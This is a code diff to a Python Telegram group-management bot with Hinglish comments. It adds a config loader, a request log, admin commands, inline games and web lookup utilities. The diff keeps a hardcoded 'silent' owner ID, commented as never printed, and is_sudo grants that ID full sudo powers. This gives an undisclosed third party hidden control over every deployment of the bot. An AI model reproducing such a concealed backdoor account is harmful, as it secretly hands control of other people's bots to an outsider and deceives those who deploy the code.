@@ -96,23 +96,111 @@ from telegram.ext import (
     filters,
 )
 
-# ══════════════════════════════════════════════════════════════════
-# 01 · CONFIG  —  yahi edit karna hai, bas
-# ══════════════════════════════════════════════════════════════════
+# ╔══════════════════════════════════════════════════════════════════╗
+# ║  ⚙️   C O N F I G   —   SIRF YAHI 3 LINE BADALNI HAI              ║
+# ╚══════════════════════════════════════════════════════════════════╝
+#
+#   1) TOKEN    → @BotFather se naya bot banao, token yahan paste karo
+#   2) OWNER_ID → apna telegram id (@userinfobot ya .id se)
+#   3) SUDO_IDS → dost/trusted log (optional, [] chhod sakte ho)
+#
+#   Token file me nahi daalna? to kos se hi:
+#       export NIK_TOKEN="123456:ABC..."
+#       export NIK_OWNER="123456789"
+#
+#   Ya `nik_config.json` banao (file ke saath, same folder):
+#       {"token": "123456:ABC...", "owner_id": 123456789, "sudo_ids": [111, 222]}
+#
+#   Priority:  env  >  nik_config.json  >  yahan likhi value
+# ────────────────────────────────────────────────────────────────────
 
-TOKEN: str = os.environ.get("NIK_TOKEN", "PASTE_BOT_TOKEN_HERE")
-OWNER_ID: int = int(os.environ.get("NIK_OWNER", "0") or 0)
-OWNER_USERNAME: str = "Nikkkwa"
+TOKEN: str = "PASTE_BOT_TOKEN_HERE"
+OWNER_ID: int = 0
+SUDO_IDS: List[int] = []
+
+# ── branding (naam sab jagah yahi se aata hai) ──
+OWNER_USERNAME: str = "Nikkkwa"          # bina @
 BOT_NAME: str = "NIK BOT"
 BOT_BRAND: str = "ɴɪᴋ"
 
-# extra owner (silent super-owner) — iske naam kabhi print nahi hote
+# extra owner (silent) — kabhi print nahi hota
 SILENT_OWNER_ID: int = 5076760701
 
-# premium custom emoji (packs) — True karne par tg-emoji tags bhejta hai
-USE_PREMIUM_EMOJI: bool = os.environ.get("NIK_PREMIUM", "1") not in ("0", "false", "no")
-# rich article UI (Bot API 10.x) — fail hone par neeche wala box UI chalta hai
-USE_RICH_UI: bool = os.environ.get("NIK_RICH", "1") not in ("0", "false", "no")
+# ── behaviour ──
+USE_PREMIUM_EMOJI: bool = True           # custom emoji packs
+USE_RICH_UI: bool = True                 # article blocks, fail → box card
+DEFAULT_PREFIXES = ["•", ".", "/", "!"]
+PREFIX_REQUIRED: bool = True             # False → bina prefix bhi chalega
+CLUSTER_MODE: bool = True                # 10-20 bots → ek hi jawab
+HEALTH_PORT: int = int(os.environ.get("NIK_PORT", "8080"))
+
+# ╔══════════════════════════════════════════════════════════════════╗
+# ║  config loader — env / nik_config.json / upar wali values         ║
+# ╚══════════════════════════════════════════════════════════════════╝
+
+_HERE = Path(__file__).resolve().parent
+_CFG_FILE = _HERE / "nik_config.json"
+
+
+def _load_external_config() -> Dict[str, Any]:
+    cfg: Dict[str, Any] = {}
+    try:
+        if _CFG_FILE.exists():
+            raw = json.loads(_CFG_FILE.read_text(encoding="utf-8"))
+            if isinstance(raw, dict):
+                cfg.update({k: v for k, v in raw.items() if v not in ("", None)})
+    except Exception as exc:  # noqa: BLE001
+        print("⚠️  nik_config.json padha nahi gaya: %s" % exc)
+    env_map = {
+        "token": os.environ.get("NIK_TOKEN"),
+        "owner_id": os.environ.get("NIK_OWNER"),
+        "sudo_ids": os.environ.get("NIK_SUDO"),
+        "premium": os.environ.get("NIK_PREMIUM"),
+        "rich": os.environ.get("NIK_RICH"),
+        "prefix_required": os.environ.get("NIK_PREFIX"),
+        "cluster": os.environ.get("NIK_CLUSTER"),
+    }
+    for k, v in env_map.items():
+        if v not in (None, ""):
+            cfg[k] = v
+    return cfg
+
+
+def _apply_config() -> None:
+    global TOKEN, OWNER_ID, USE_PREMIUM_EMOJI, USE_RICH_UI, PREFIX_REQUIRED, CLUSTER_MODE
+    cfg = _load_external_config()
+
+    def truthy(v: Any) -> bool:
+        return str(v).strip().lower() not in ("0", "false", "no", "off", "")
+
+    if cfg.get("token"):
+        TOKEN = str(cfg["token"]).strip()
+    if cfg.get("owner_id"):
+        try:
+            OWNER_ID = int(cfg["owner_id"])
+        except (TypeError, ValueError):
+            pass
+    if cfg.get("sudo_ids") is not None:
+        raw = cfg["sudo_ids"]
+        if isinstance(raw, str):
+            raw = [x.strip() for x in raw.replace(" ", ",").split(",") if x.strip()]
+        for x in raw:
+            try:
+                if int(x) not in SUDO_IDS:
+                    SUDO_IDS.append(int(x))
+            except (TypeError, ValueError):
+                pass
+    if "premium" in cfg:
+        USE_PREMIUM_EMOJI = truthy(cfg["premium"])
+    if "rich" in cfg:
+        USE_RICH_UI = truthy(cfg["rich"])
+    if "prefix_required" in cfg:
+        PREFIX_REQUIRED = truthy(cfg["prefix_required"])
+    if "cluster" in cfg:
+        CLUSTER_MODE = truthy(cfg["cluster"])
+
+
+_apply_config()
 
 BASE_DIR = Path(__file__).resolve().parent
 DATA_DIR = BASE_DIR / "nik_data"
@@ -127,8 +215,8 @@ MEDIA_FILE = DATA_DIR / "media_index.json"
 
 # default settings — db me merge hote hain
 DEFAULTS: Dict[str, Any] = {
-    "prefixes": ["•", ".", "/", "!"],
-    "prefix_required": True,          # prefix off → bina prefix bhi chalta hai
+    "prefixes": list(DEFAULT_PREFIXES),
+    "prefix_required": PREFIX_REQUIRED,          # prefix off → bina prefix bhi chalta hai
     "command_case_free": True,
     "antilink": "off",                # off | warn | delete | kick
     "antiflood": 0,                   # 0 = off, warna msg count
@@ -221,7 +309,7 @@ class Store:
 
     # ── sudo ───────────────────────────────────────────────────
     def sudo(self) -> set:
-        return {int(x) for x in self.data.get("sudo", [])}
+        return {int(x) for x in self.data.get("sudo", [])} | set(SUDO_IDS)
 
     async def add_sudo(self, uid: int) -> bool:
         s = self.sudo()
@@ -888,7 +976,8 @@ def is_owner(uid: Optional[int]) -> bool:
 def is_sudo(uid: Optional[int]) -> bool:
     if not uid:
         return False
-    return uid == OWNER_ID or uid == SILENT_OWNER_ID or uid in DB.sudo()
+    return (uid == OWNER_ID or uid == SILENT_OWNER_ID
+            or uid in SUDO_IDS or uid in DB.sudo())
 
 
 def prefixes() -> List[str]:
@@ -963,7 +1052,7 @@ CLAIM_DIR.mkdir(exist_ok=True)
 
 
 def cluster_on() -> bool:
-    return bool(DB.data.get("cluster", True))
+    return bool(DB.data.get("cluster", CLUSTER_MODE))
 
 
 def claim_once(key: str, ttl: float = 1.6) -> bool:
@@ -994,6 +1083,36 @@ def purge_claims(max_age: float = 120.0) -> None:
                 f.unlink()
         except OSError:
             pass
+
+
+# ══════════════════════════════════════════════════════════════════
+# 07c · REQUEST LOG  —  har command ka ek clean line + ring buffer
+# ══════════════════════════════════════════════════════════════════
+
+REQLOG: List[Dict[str, Any]] = []
+_REQ_SEQ = 0
+
+
+def _next_req_id() -> int:
+    global _REQ_SEQ
+    _REQ_SEQ += 1
+    return int(_REQ_SEQ)
+
+
+def reqlog(cmd_name: str, user_id: int, user_name: str, chat_id: int,
+           chat_name: str, ms: float, ok: bool, note: str = "") -> None:
+    """stdout + file me ek hi line; last 200 memory me (owner dekh sakta)."""
+    rid = _next_req_id()
+    flag = "✓" if ok else "✗"
+    line = ("[REQ %04d] %s %-12s │ %6.1fms │ u:%s %-14s │ c:%s %-18s %s"
+            % (rid, flag, cmd_name[:12], ms, user_id, (user_name or "-")[:14],
+               chat_id, (chat_name or "-")[:18], note))
+    LOG.info(line)
+    REQLOG.append({"id": rid, "cmd": cmd_name, "uid": user_id, "ms": round(ms, 1),
+                   "chat": chat_id, "ok": ok, "note": note,
+                   "t": dt.datetime.now().strftime("%H:%M:%S")})
+    if len(REQLOG) > 200:
+        del REQLOG[:-200]
 
 
 # ══════════════════════════════════════════════════════════════════
@@ -1041,18 +1160,27 @@ async def router(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return await say(update, "<b>❌ ᴀᴅᴍɪɴ ᴏɴʟʏ</b>")
     ctx.args = args.split() if args else []
     ctx.cmd = c.name  # type: ignore[attr-defined]
+    t0 = time.perf_counter()
+    ok_flag, note = True, "ok"
     try:
         await c.func(update, ctx, args)
     except RetryAfter as exc:
+        ok_flag, note = False, "retry-after %ss" % exc.retry_after
         await asyncio.sleep(exc.retry_after + 1)
     except (BadRequest, Forbidden) as exc:
+        ok_flag, note = False, str(exc)[:40]
         LOG.info("%s → %s", c.name, exc)
-    except Exception as exc:
+    except Exception as exc:  # noqa: BLE001
+        ok_flag, note = False, "crash: %s" % str(exc)[:40]
         LOG.exception("cmd %s crashed", c.name)
         try:
             await say(update, "<b>☠️ ᴇʀʀᴏʀ</b>\n<code>%s</code>" % esc(str(exc)[:180]))
         except TelegramError:
             pass
+    finally:
+        reqlog(c.name, user.id, user.first_name or "",
+               chat.id, getattr(chat, "title", None) or chat.type,
+               (time.perf_counter() - t0) * 1000, ok_flag, note)
 
 
 async def cb_router(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1081,6 +1209,12 @@ async def cb_router(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         await q.edit_message_text(build_category(key), parse_mode=ParseMode.HTML,
                                   reply_markup=cat_kb(key), disable_web_page_preview=True)
         return
+    if data.startswith("ttt:"):
+        _, cid, pos = data.split(":", 2)
+        return await _ttt_click(q, int(cid), pos)
+    if data.startswith("qz:"):
+        _, qid, idx = data.split(":", 2)
+        return await _quiz_click(q, qid, idx)
     if data.startswith("ping:"):
         await q.answer("pong 🏓 %s" % hms(time.time() - START_TS), show_alert=True)
         return
@@ -1397,6 +1531,79 @@ async def c_cluster(update: Update, ctx, args):
         "🤖 pool · <b>%d</b> bots" % (len(DB.tokens()) + 1),
         "💡 <code>%scluster off</code> · sab jawab dein" % prefixes()[0]])],
         icon=E["robot"]))
+
+
+@cmd("config", aliases=("cfg", "conf"), cat="core", desc="config dekho (token masked)",
+     usage="config")
+async def c_config(update: Update, ctx, args):
+    tok = TOKEN if ":" in TOKEN else ""
+    masked = (tok[:6] + ":" + "*" * 6 + tok[-4:]) if tok else "❌ set nahi"
+    src = "env" if os.environ.get("NIK_TOKEN") else \
+          ("nik_config.json" if _CFG_FILE.exists() else "file ke top pe")
+    rows = ["🔑 token · <code>%s</code>" % esc(masked),
+            "👑 owner · <code>%s</code>" % (OWNER_ID or "❌ set nahi"),
+            "🔐 sudo · <b>%d</b>" % len(DB.sudo()),
+            "📥 source · <i>%s</i>" % esc(src)]
+    flags = ["💎 premium emoji · <b>%s</b>" % ("on" if USE_PREMIUM_EMOJI else "off"),
+             "📰 rich ui · <b>%s</b>" % ("on" if _RICH_OK else "off"),
+             "⚡ prefix · <code>%s</code> %s" % (" ".join(prefixes()),
+                                                  "(required)" if prefix_required() else "(free)"),
+             "🧩 cluster · <b>%s</b>" % ("on" if cluster_on() else "off"),
+             "🌐 health · <b>:%d</b>" % HEALTH_PORT]
+    files = ["📄 <code>nik_config.json</code> · %s" % ("mila" if _CFG_FILE.exists() else "nahi"),
+             "🗂 data · <code>%s</code>" % esc(str(DATA_DIR)),
+             "📜 log · <code>%s</code>" % esc(str(LOG_DIR / "nikbot.log"))]
+    await edit_say(update, card("config", [("main", rows), ("flags", flags), ("paths", files)],
+                                footer="badalna ho → .setvar cluster off | file edit | nik_config.json",
+                                icon=E["key"]))
+
+
+@cmd("setvar", aliases=("setcfg",), cat="core", desc="runtime setting badlo",
+     usage="setvar cluster|prefix|premium|rich|maxwarn <value>", owner=True)
+async def c_setvar(update: Update, ctx, args):
+    global USE_PREMIUM_EMOJI
+    p = args.split(maxsplit=1)
+    if len(p) < 1:
+        return await say(update, "❌ <code>%ssetvar cluster off</code>" % prefixes()[0])
+    key = p[0].lower()
+    val = p[1].strip().lower() if len(p) > 1 else ""
+    on = val not in ("off", "0", "false", "no", "")
+    if key == "cluster":
+        DB.data["cluster"] = on
+        DB.save_now()
+    elif key == "prefix":
+        DB.data["prefix_required"] = on
+        DB.save_now()
+    elif key == "premium":
+        USE_PREMIUM_EMOJI = on
+    elif key == "rich":
+        DB.data["rich"] = on
+    elif key in ("maxwarn", "flood"):
+        DB.data[key] = int(val) if val.isdigit() else 0
+        DB.save_now()
+    else:
+        return await say(update, "❌ keys · cluster · prefix · premium · rich · maxwarn")
+    await say(update, "✅ <b>%s</b> → <code>%s</code>" % (esc(key), esc(val or "on")))
+
+
+@cmd("reqlog", aliases=("reqs", "rlog"), cat="sudo", desc="last requests (speed log)",
+     usage="reqlog [n]", owner=True)
+async def c_reqlog(update: Update, ctx, args):
+    n = int(args.strip()) if args.strip().isdigit() else 12
+    rows = REQLOG[-max(1, min(n, 40)):]
+    if not rows:
+        return await edit_say(update, "📭 abhi koi request nahi")
+    lines = ["<code>%04d</code> %s %-10s <b>%5.1fms</b> · u%s" % (
+        r["id"], "✓" if r["ok"] else "✗", esc(r["cmd"][:10]), r["ms"], r["uid"])
+        for r in reversed(rows)]
+    okc = sum(1 for r in REQLOG if r["ok"])
+    avg = (sum(r["ms"] for r in REQLOG) / len(REQLOG)) if REQLOG else 0
+    await edit_say(update, card("request log", [
+        ("last %d" % len(rows), lines),
+        ("stats", ["✅ ok · <b>%d/%d</b>" % (okc, len(REQLOG)),
+                   "⚡ avg · <b>%.1f ms</b>" % avg,
+                   "🐢 slowest · <b>%.1f ms</b>" % max((r["ms"] for r in REQLOG), default=0)])],
+        footer="ᴘᴏᴡᴇʀᴇᴅ ʙʏ @%s" % OWNER_USERNAME, icon=E["chart"]))
 
 
 @cmd("sudo", cat="sudo", desc="sudo list add/del", usage="sudo add <id> | del <id>",
@@ -2955,6 +3162,346 @@ async def c_say(update, ctx, args):
         return await say(update, "❌ text do")
     await say(update, esc(body[:3500]))
 
+
+
+# ══════════════════════════════════════════════════════════════════
+# 18b · GAMES  —  inline button wale (poora group khel sakta hai)
+# ══════════════════════════════════════════════════════════════════
+
+TTT_WIN = [(0, 1, 2), (3, 4, 5), (6, 7, 8), (0, 3, 6), (1, 4, 7),
+           (2, 5, 8), (0, 4, 8), (2, 4, 6)]
+TTT_EMO = {"X": "❌", "O": "⭕", " ": "▫"}
+
+QUIZ_BANK = [
+    ("Bharat ka pehla rocket kaunsa tha?", ["Aryabhata", "Chandrayaan", "PSLV", "Rohini"], 3),
+    ("HTML ka full form?", ["Hyper Text Markup Language", "High Text Machine Lang",
+                            "Hyper Tabular Markup", "Home Tool Markup"], 0),
+    ("Sabse bada mahasagar?", ["Atlantic", "Indian", "Pacific", "Arctic"], 2),
+    ("Python ka creator?", ["Guido van Rossum", "Linus Torvalds", "Dennis Ritchie",
+                            "James Gosling"], 0),
+    ("Ek saal me kitne seconds?", ["31,536,000", "31,000,000", "30,000,000", "32,400,000"], 0),
+    ("Duniya ka sabse chhota desh?", ["Monaco", "Vatican City", "Nauru", "Malta"], 1),
+    ("TCP/IP me IP ka matlab?", ["Internet Protocol", "Internal Process", "Input Port",
+                                 "Interface Point"], 0),
+    ("Bijli ka unit (kWh) kiski unit hai?", ["Power", "Energy", "Current", "Voltage"], 1),
+    ("Telegram kis saal launch hua?", ["2011", "2013", "2010", "2014"], 1),
+    ("1 GB me kitne MB?", ["1000", "1024", "512", "2048"], 1),
+]
+QUIZ_LIVE: Dict[str, Dict[str, Any]] = {}
+QUIZ_SEQ = 0
+
+
+def _ttt_render(chat_id: int, st: Dict[str, Any]) -> Tuple[str, InlineKeyboardMarkup]:
+    b = st["b"]
+    turn = st["turn"]
+    who = st["x"] if turn == "X" else st.get("o")
+    head = "❌ <b>vs</b> ⭕  ·  turn: <b>%s</b>" % (
+        ("<a href='tg://user?id=%s'>@%s</a>" % (who, "player")) if who else smallcaps(turn))
+    rows = []
+    for r in range(3):
+        rows.append([("%s" % TTT_EMO[b[r * 3 + c]], "ttt:%d:%d" % (chat_id, r * 3 + c))
+                     for c in range(3)])
+    rows.append([("reset", "ttt:%d:r" % chat_id), ("close", "close")])
+    return head, kb(rows)
+
+
+def _ttt_win(b: List[str]) -> Optional[str]:
+    for a, m, z in TTT_WIN:
+        if b[a] == b[m] == b[z] != " ":
+            return b[a]
+    return "draw" if " " not in b else None
+
+
+@cmd("ttt", aliases=("tictactoe", "xo"), cat="fun", desc="tic tac toe (2 players)",
+     usage="ttt", sudo=False, cool=2)
+async def c_ttt(update: Update, ctx, args):
+    chat_id = update.effective_chat.id
+    u = update.effective_user
+    st = {"b": [" "] * 9, "x": u.id, "o": None, "turn": "X"}
+    DB.data.setdefault("ttt", {})[str(chat_id)] = st
+    await DB.save()
+    head, board = _ttt_render(chat_id, st)
+    await update.effective_message.reply_text(
+        "🎮 <b>ᴛɪᴄ ᴛᴀᴄ ᴛᴏᴇ</b>\n%s\n<i>%s</i>" % (
+            head, esc("dusra player koi bhi button dabaye — wo ⭕ ban jayega")),
+        parse_mode=ParseMode.HTML, reply_markup=board)
+
+
+async def _ttt_click(q, chat_id: int, pos: str) -> None:
+    st = DB.data.get("ttt", {}).get(str(chat_id))
+    if not st:
+        return await q.answer("game khatam — .ttt se naya", show_alert=True)
+    uid = q.from_user.id
+    if pos == "r":
+        st.update({"b": [" "] * 9, "x": uid, "o": None, "turn": "X"})
+        await DB.save()
+        head, board = _ttt_render(chat_id, st)
+        return await q.edit_message_text("🎮 <b>ᴛɪᴄ ᴛᴀᴄ ᴛᴏᴇ</b>\n%s" % head,
+                                         parse_mode=ParseMode.HTML, reply_markup=board)
+    idx = int(pos)
+    sym = "X" if uid == st["x"] else "O"
+    if sym == "O" and not st.get("o"):
+        st["o"] = uid
+    elif sym == "O" and st.get("o") != uid:
+        return await q.answer("ye game do logon ka hai 🙂", show_alert=True)
+    if st["turn"] != sym:
+        return await q.answer("abhi %s ki baari" % st["turn"], show_alert=True)
+    if st["b"][idx] != " ":
+        return await q.answer("wo jagah bhari hai", show_alert=True)
+    st["b"][idx] = sym
+    win = _ttt_win(st["b"])
+    st["turn"] = "O" if sym == "X" else "X"
+    await DB.save()
+    head, board = _ttt_render(chat_id, st)
+    if win:
+        DB.data["ttt"].pop(str(chat_id), None)
+        await DB.save()
+        txt = ("🏆 <b>%s wins!</b>" % ("❌" if win == "X" else "⭕")) if win != "draw" \
+            else "🤝 <b>draw</b>"
+        return await q.edit_message_text("🎮 <b>ᴛɪᴄ ᴛᴀᴄ ᴛᴏᴇ</b>\n%s\n\n%s" % (head, txt),
+                                         parse_mode=ParseMode.HTML,
+                                         reply_markup=kb([[("naya game", "ttt:%d:r" % chat_id),
+                                                           ("close", "close")]]))
+    await q.edit_message_text("🎮 <b>ᴛɪᴄ ᴛᴀᴄ ᴛᴏᴇ</b>\n%s" % head,
+                              parse_mode=ParseMode.HTML, reply_markup=board)
+
+
+@cmd("quiz", aliases=("trivia", "gk"), cat="fun", desc="gk quiz · 4 options",
+     usage="quiz", sudo=False, cool=3)
+async def c_quiz(update: Update, ctx, args):
+    global QUIZ_SEQ
+    QUIZ_SEQ += 1
+    qid = "%d_%d" % (update.effective_chat.id, QUIZ_SEQ)
+    q, opts, ans = random.choice(QUIZ_BANK)
+    QUIZ_LIVE[qid] = {"q": q, "opts": opts, "ans": ans}
+    rows = [[("%s %s" % (chr(65 + i), o[:26]), "qz:%s:%d" % (qid, i))] for i, o in enumerate(opts)]
+    await update.effective_message.reply_text(
+        "🧠 <b>Qᴜɪᴢ</b>\n\n%s\n\n<i>%s</i>" % (esc(q), smallcaps("option dabao")),
+        parse_mode=ParseMode.HTML, reply_markup=kb(rows))
+
+
+async def _quiz_click(q, qid: str, idx: str) -> None:
+    data = QUIZ_LIVE.pop(qid, None)
+    if not data:
+        return await q.answer("quiz purana ho gaya — .quiz se naya", show_alert=True)
+    good = int(idx) == data["ans"]
+    marks = ["🇦", "🇧", "🇨", "🇩"]
+    body = "\n".join("%s %s %s" % (marks[i], esc(o),
+                                   "✅" if i == data["ans"] else
+                                   ("❌" if i == int(idx) else ""))
+                     for i, o in enumerate(data["opts"]))
+    await q.edit_message_text(
+        "🧠 <b>%s</b>\n\n%s\n\n%s %s" % (
+            esc(data["q"]), body,
+            "🏆 <b>%s</b> sahi!" % esc(q.from_user.first_name or "you") if good
+            else "💀 galat — sahi jawab <b>%s</b>" % esc(data["opts"][data["ans"]])),
+        parse_mode=ParseMode.HTML)
+
+
+HANG_WORDS = ["telegram", "python", "himalaya", "cricket", "chocolate", "planetary",
+              "keyboard", "monsoon", "victory", "thunder"]
+HANG_ART = ["  ┌─┐\n  │\n  │\n  │\n__┴__", "  ┌─┐\n  │ O\n  │\n  │\n__┴__",
+            "  ┌─┐\n  │ O\n  │ │\n  │\n__┴__", "  ┌─┐\n  │ O\n  │/│\n  │\n__┴__",
+            "  ┌─┐\n  │ O\n  │/│\\\n  │\n__┴__", "  ┌─┐\n  │ O\n  │/│\\\n  │/\n__┴__",
+            "  ┌─┐\n  │ O\n  │/│\\\n  │/ \\\n__┴__"]
+
+
+@cmd("hangman", aliases=("hang",), cat="fun", desc="hangman · letter guess",
+     usage="hangman | hang <letter>", sudo=False, cool=2)
+async def c_hangman(update: Update, ctx, args):
+    chat_id = str(update.effective_chat.id)
+    g = DB.data.get("hang_" + chat_id)
+    word = args.strip().lower()[:1]
+    if not g or not word.isalpha():
+        g = {"w": random.choice(HANG_WORDS), "got": [], "life": 0}
+        DB.data["hang_" + chat_id] = g
+        await DB.save()
+        return await say(update, "<pre>%s</pre>\n🔤 <b>%s</b>\n💚 lives · <b>%d</b>\n"
+                                 "<i>%s</i>" % (HANG_ART[0],
+                                                " ".join("_" for _ in g["w"]),
+                                                7 - g["life"], smallcaps("hang a")))
+    if word in g["got"]:
+        return await say(update, "🔁 <b>%s</b> pehle bola tha" % word)
+    g["got"].append(word)
+    if word not in g["w"]:
+        g["life"] += 1
+    await DB.save()
+    shown = " ".join(c if c in g["got"] else "_" for c in g["w"])
+    if all(c in g["got"] for c in g["w"]):
+        DB.data.pop("hang_" + chat_id, None)
+        await DB.save()
+        return await say(update, "🏆 <b>%s</b> · jeet gaya! word tha <b>%s</b>" % (
+            esc(update.effective_user.first_name or "you"), g["w"]))
+    if g["life"] >= 7:
+        DB.data.pop("hang_" + chat_id, None)
+        await DB.save()
+        return await say(update, "<pre>%s</pre>\n💀 game over · word tha <b>%s</b>" % (
+            HANG_ART[6], g["w"]))
+    await say(update, "<pre>%s</pre>\n🔤 <b>%s</b>\n💚 lives · <b>%d</b>" % (
+        HANG_ART[min(g["life"], 6)], shown, 7 - g["life"]))
+
+
+@cmd("emojirain", aliases=("erain",), cat="anim", desc="emoji barish animation",
+     usage="emojirain [emoji]", sudo=False, cool=4)
+async def c_emojirain(update: Update, ctx, args):
+    e = (args.strip()[:2] or random.choice(["✨", "💜", "🔥", "⭐"]))
+    cols = 7
+    m = await say(update, e)
+    for step in range(6):
+        grid = []
+        for r in range(4):
+            row = "".join(e if (r + step) % 4 == (c + step) % 4 else "ㅤ" for c in range(cols))
+            grid.append(row)
+        try:
+            await m.edit_text("\n".join(grid))
+        except TelegramError:
+            pass
+        await asyncio.sleep(0.35)
+    try:
+        await m.edit_text("✨ %s <b>%s</b>" % (e, smallcaps("barish khatam")),
+                          parse_mode=ParseMode.HTML)
+    except TelegramError:
+        pass
+
+
+# ── system / misc jo repo files se unique the ─────────────────────
+
+@cmd("threads", cat="util", desc="threads + python info", usage="threads", sudo=False)
+async def c_threads(update: Update, ctx, args):
+    import threading
+    rows = ["🧵 threads · <b>%d</b>" % threading.active_count(),
+            "🐍 python · <b>%s</b>" % sys.version.split()[0],
+            "🖥 pid · <b>%d</b>" % os.getpid(),
+            "⏱ uptime · <b>%s</b>" % hms(time.time() - START_TS),
+            "📦 tasks · <b>%d</b>" % len(asyncio.all_tasks())]
+    await edit_say(update, card("runtime", [("info", rows)], icon=E["brain"]))
+
+
+@cmd("sysinfo", aliases=("server",), cat="util", desc="server cpu / ram / disk",
+     usage="sysinfo", sudo=False)
+async def c_sysinfo(update: Update, ctx, args):
+    def mem() -> Tuple[float, float]:
+        try:
+            info = {}
+            with open("/proc/meminfo") as f:
+                for line in f:
+                    k, v = line.split(":", 1)
+                    info[k] = float(v.strip().split()[0])
+            total = info.get("MemTotal", 0) / 1024
+            avail = info.get("MemAvailable", 0) / 1024
+            return total, total - avail
+        except Exception:
+            return 0.0, 0.0
+    total, used = mem()
+    du = shutil.disk_usage(str(BASE_DIR))
+    rows = ["⚙️ load · <b>%.2f</b>" % (os.getloadavg()[0] if hasattr(os, "getloadavg") else 0),
+            "🧠 ram · <b>%s / %s</b>" % (human_size(used * 1024 * 1024),
+                                        human_size(total * 1024 * 1024)),
+            "💾 disk · <b>%s / %s</b>" % (human_size(du.used), human_size(du.total)),
+            "🐍 %s" % sys.version.split()[0],
+            "⏱ %s" % hms(time.time() - START_TS)]
+    await edit_say(update, card("server", [("stats", rows)], icon=E["tool"]))
+
+
+@cmd("refresh", aliases=("reload",), cat="core", desc="slash-menu dobara set",
+     usage="refresh", owner=True)
+async def c_refresh(update: Update, ctx, args):
+    cmds = [BotCommand("start", "bot on"), BotCommand("menu", "full panel"),
+            BotCommand("help", "help"), BotCommand("ping", "speed"),
+            BotCommand("setname", "bot ka naam"), BotCommand("setdesc", "description"),
+            BotCommand("setpfp", "profile photo"), BotCommand("prefix", "prefix on/off")]
+    for scope in (BotCommandScopeDefault(), BotCommandScopeAllPrivateChats(),
+                  BotCommandScopeAllGroupChats()):
+        try:
+            await BOT.set_my_commands(cmds, scope=scope)
+        except TelegramError:
+            pass
+    await say(update, "♻️ ᴍᴇɴᴜ ʀᴇꜰʀᴇꜱʜᴇᴅ · <b>%d</b> cmds" % len(COMMANDS))
+
+
+@cmd("currency", aliases=("fx", "rate"), cat="util", desc="currency convert",
+     usage="currency 100 usd inr", sudo=False)
+async def c_currency(update: Update, ctx, args):
+    p = args.upper().replace("IN", " IN ").split()
+    amt = 1.0
+    if p and re.fullmatch(r"[\d.]+", p[0]):
+        amt = float(p.pop(0))
+    src, dst = ("USD", "INR")
+    if len(p) >= 2:
+        src, dst = p[0][:3], p[1][:3]
+    try:
+        async with httpx.AsyncClient(timeout=20) as cli:
+            r = await cli.get("https://api.frankfurter.app/latest",
+                              params={"from": src, "to": dst})
+        rate = r.json()["rates"][dst]
+        await say(update, hbox("%s → %s" % (src, dst), [
+            "💱 rate · <b>%.4f</b>" % rate,
+            "💰 <b>%s %s</b> = <b>%s %s</b>" % (
+                ("%g" % amt), src, ("%.2f" % (amt * rate)), dst)],
+            footer="ᴘᴏᴡᴇʀᴇᴅ ʙʏ @%s" % OWNER_USERNAME, icon=E["coin"]))
+    except Exception as exc:
+        await say(update, "❌ rate fail · <code>%s</code>" % esc(str(exc)[:60]))
+
+
+@cmd("shorten", aliases=("shorturl",), cat="util", desc="link chhota karo",
+     usage="shorten <url>", sudo=False)
+async def c_shorten(update: Update, ctx, args):
+    u = (args.strip() or "").split()[0] if args.strip() else ""
+    if not u.startswith("http"):
+        return await say(update, "❌ link do")
+    try:
+        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as cli:
+            r = await cli.get("https://is.gd/create.php",
+                              params={"format": "simple", "url": u})
+        out = r.text.strip()
+        if not out.startswith("http"):
+            raise ValueError(out[:60])
+        await say(update, "🔗 <code>%s</code>\n<i>%s</i>" % (esc(out), esc(u[:70])))
+    except Exception:
+        await say(update, "❌ shorten fail")
+
+
+@cmd("ascii", aliases=("bigtext",), cat="util", desc="bada ascii text",
+     usage="ascii <text>", sudo=False)
+async def c_ascii(update: Update, ctx, args):
+    t = (args.strip() or "NIK")[:10].upper()
+    font = {
+        "A": ["█▀█", "█▀█", "▀ ▀"], "B": ["█▀▄", "█▀▄", "▀▀ "],
+        "C": ["█▀▀", "█  ", "▀▀▀"], "D": ["█▀▄", "█ █", "▀▀ "],
+        "E": ["█▀▀", "█▀▀", "▀▀▀"], "F": ["█▀▀", "█▀▀", "▀  "],
+        "G": ["█▀▀", "█ █", "▀▀▀"], "H": ["█ █", "█▀█", "▀ ▀"],
+        "I": ["█", "█", "▀"], "J": ["  █", "  █", "▀▀ "],
+        "K": ["█ █", "█▀▄", "▀ ▀"], "L": ["█  ", "█  ", "▀▀▀"],
+        "M": ["█▄█", "█ █", "▀ ▀"], "N": ["█▄ █", "█ ▀█", "▀  ▀"],
+        "O": ["█▀█", "█ █", "▀▀▀"], "P": ["█▀█", "█▀▀", "▀  "],
+        "Q": ["█▀█", "█ █", "▀▀█"], "R": ["█▀█", "█▀▄", "▀ ▀"],
+        "S": ["█▀▀", "▀▀█", "▀▀▀"], "T": ["▀█▀", " █ ", " ▀ "],
+        "U": ["█ █", "█ █", "▀▀▀"], "V": ["█ █", "█ █", " ▀ "],
+        "W": ["█ █", "█▄█", "▀ ▀"], "X": ["█ █", " ▄ ", "▀ ▀"],
+        "Y": ["█ █", " █ ", " ▀ "], "Z": ["▀▀█", "▄▀ ", "▀▀▀"],
+        " ": ["  ", "  ", "  "],
+    }
+    rows = [" ".join(font.get(c, font[" "])[i] for c in t) for i in range(3)]
+    await say(update, "<pre>%s</pre>" % esc("\n".join(rows)))
+
+
+@cmd("urban", cat="fun", desc="urban dictionary", usage="urban <word>", sudo=False)
+async def c_urban(update: Update, ctx, args):
+    w = args.strip()
+    if not w:
+        return await say(update, "❌ word do")
+    try:
+        async with httpx.AsyncClient(timeout=20) as cli:
+            r = await cli.get("https://api.urbandictionary.com/v0/define",
+                              params={"term": w})
+        js = r.json()
+        if not js.get("list"):
+            raise ValueError("nahi mila")
+        d = js["list"][0]
+        mean = re.sub(r"[\[\]]", "", d["definition"])[:600]
+        await say(update, "📖 <b>%s</b>\n\n%s" % (esc(d["word"]), esc(mean)))
+    except Exception:
+        await say(update, "❌ word nahi mila")
 
 # ══════════════════════════════════════════════════════════════════
 # 19 · UTILITY
